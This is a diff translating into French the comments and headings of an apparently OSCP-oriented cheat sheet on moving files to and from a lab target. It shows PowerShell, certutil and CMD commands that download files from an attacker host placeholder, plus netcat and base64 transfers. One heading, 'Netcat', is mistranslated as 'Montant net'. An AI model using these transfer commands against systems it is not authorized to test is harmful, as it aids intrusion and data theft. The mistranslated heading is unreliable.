@@ -88,20 +88,20 @@ python3 -m http.server 80
 <p class="oscp-command-note">Script shell dans la rubrique « Requêtes HTTP ».</p>
 
 ```bash
-# From PowerShell
+# Depuis PowerShell
 (New-Object System.Net.WebClient).DownloadFile('http://[kali_IP]/[file_to_download]', '[output_file_name_or_path]')
 
 Invoke-WebRequest -Uri http://[kali_IP]/[file_to_download] -OutFile [output_file_name]
 
-# If iwr does not work 
+# Si iwr ne fonctionne pas
 certutil -urlcache -split -f http://[kali_IP]/[file_to_download]
 
-# From CMD
+# Depuis CMD
 powershell -Command "(New-Object Net.WebClient).DownloadFile('http://[kali_IP]/[file_to_download]', '[output_file_name_or_path]')"
 ```
 
 
-## PHP Script (bring files from Windows)
+## PHP Script (apporter des fichiers depuis Windows)
 
 Examiner les entrées et les réponses de l'application web.
 
@@ -161,7 +161,7 @@ service apache2 stop
 ```
 
 
-## Netcat
+## Montant net
 
 Vérifier les ports et les services de la cible autorisée.
 
@@ -174,7 +174,7 @@ Vérifier les ports et les services de la cible autorisée.
 ```bash
 nc -lvp 4444 > received_file.txt
 
-# (Optional) If we need to transfer the files over an encrypted connection just attach the --ssl option
+# (facultatif) Si nous avons besoin de transférer les fichiers sur une connexion chiffrée, il suffit de joindre l'option --ssl
 ncat --ssl -lvp 4444 > received_file.txt
 ```
 
@@ -184,12 +184,12 @@ ncat --ssl -lvp 4444 > received_file.txt
 ```bash
 nc <receiver_IP> 4444 < file_to_send.txt
 
-# (Optional) If we need to receive the files over an encrypted connection just attach the --ssl option
+# (facultatif) Si nous avons besoin de recevoir les fichiers sur une connexion chiffrée, il suffit de joindre l'option --ssl
 ncat --ssl <receiver_IP> 4444 < file_to_send.txt
 ```
 
 
-### Send a File with Compression
+### Envoyer un fichier avec compression
 
 
 <p class="oscp-command-note">Ouvrir un port d&#x27;écoute Netcat.</p>
@@ -214,7 +214,7 @@ Transférer ou récupérer des fichiers dans le laboratoire.
 
 
 ```bash
-# This will print the Base64 string directly in the terminal, which you can copy manually
+# Ceci va imprimer la chaîne Base64 directement dans le terminal, que vous pouvez copier manuellement
 base64 file_to_send.txt
 ```
 
@@ -222,7 +222,7 @@ base64 file_to_send.txt
 <p class="oscp-command-note">Afficher ou écrire une valeur.</p>
 
 ```bash
-# You can manually paste the Base64-encoded content into a new file
+# Vous pouvez coller manuellement le contenu encodé Base64 dans un nouveau fichier
 echo "PASTE_BASE64_CONTENTS_HERE" | base64 -d > received_file.txt
 ```
 
